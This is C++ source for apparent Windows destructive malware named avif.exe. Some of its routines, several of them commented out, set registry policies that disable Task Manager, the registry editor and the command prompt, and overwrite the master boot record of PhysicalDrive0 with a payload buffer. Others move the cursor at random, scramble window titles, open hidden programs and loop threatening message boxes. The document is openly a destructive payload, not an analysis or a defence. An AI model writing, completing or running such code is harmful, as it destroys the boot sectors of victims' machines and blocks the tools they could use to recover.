

/* azerty */;

/* namespace Destruction {

void DisableSystemTools() {
	ShellExecute(NULL, "open", "reg", "add hkcu\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "reg", "add hkcu\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecute(NULL, "open", "reg", "add hkcu\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t reg_dword /d 1 /f", NULL, SW_HIDE);
}

void BootPayload() {
	DWORD bytesWritten;
	HANDLE MBRTrasher = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (MBRTrasher == INVALID_HANDLE_VALUE) {
		MessageBox(NULL, "Error while opening hard drive: Handle value is invalid.", "avif.exe", MB_OK|MB_ICONERROR);
		CloseHandle(MBRTrasher);
		ExitProcess(0);
	}
	if (!WriteFile(MBRTrasher, BootRecord, 512, &bytesWritten, 0)) {
		MessageBox(NULL, "Error while overwriting the boot sector: Unknown.", "avif.exe", MB_OK|MB_ICONERROR);
		CloseHandle(MBRTrasher);
		ExitProcess(0);
	}
}

} */

namespace Threads {

void threads(HANDLE thread) {
	TerminateThread(thread, 0);
	CloseHandle(thread);
}
}

namespace Message {
	DWORD __stdcall Messagebox(LPVOID lpvd) {
		while (1) {
			MessageBox(NULL, "IT\'S ALL COMING DOWN!!!", "THERE IS NO MERCY!!!", MB_OK|MB_ICONWARNING);
		}
	}
}

/* namespace Shell {
	DWORD __stdcall OpenPrograms(LPVOID lpvd) {
		ShellExecuteA(NULL, "open", "notepad", NULL, NULL, SW_HIDE);
		Sleep(500);
		ShellExecuteA(NULL, "open", "dxdiag", NULL, NULL, SW_HIDE);
		Sleep(500);
		ShellExecuteA(NULL, "open", "taskmgr", NULL, NULL, SW_HIDE);
		Sleep(500);
		ShellExecuteA(NULL, "open", "winver", NULL, NULL, SW_HIDE);
		Sleep(500);
		ShellExecuteA(NULL, "open", "cmd", NULL, NULL, SW_HIDE);
		Sleep(500);
		ShellExecuteA(NULL, "open", "calc", NULL, NULL, SW_HIDE);
		return 0;
	}
	
	DWORD __stdcall StringQuestionMarks(LPVOID lpvd) {
		while (1) {
			SetWindowTextA(GetForegroundWindow(), "??????????????????????????????????????????????????????????????");
			Sleep(10);
		}
	}
} 

namespace Mouse {
	DWORD __stdcall SetMousePosition(LPVOID lpvd) {
		int sw, sh;
		while (1) {
			sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
			SetCursorPos(rand () % sw, rand () % sh);
		}
	}
	
	DWORD __stdcall PasteMouse(LPVOID lpvd) {
		POINT cur;
		HDC hdc;
		int sw, sh;
		while (1) {
			hdc = GetDC(0);
			sw = GetSystemMetrics(SM_CXICON), sh = GetSystemMetrics(SM_CYICON);
			GetCursorPos(&cur);
			DrawIcon(hdc, cur.x - sw, cur.y - sh, LoadCursorA(NULL, IDC_ARROW));
			ReleaseDC(NULL, hdc);
			Sleep(10);
		}
	}
} */
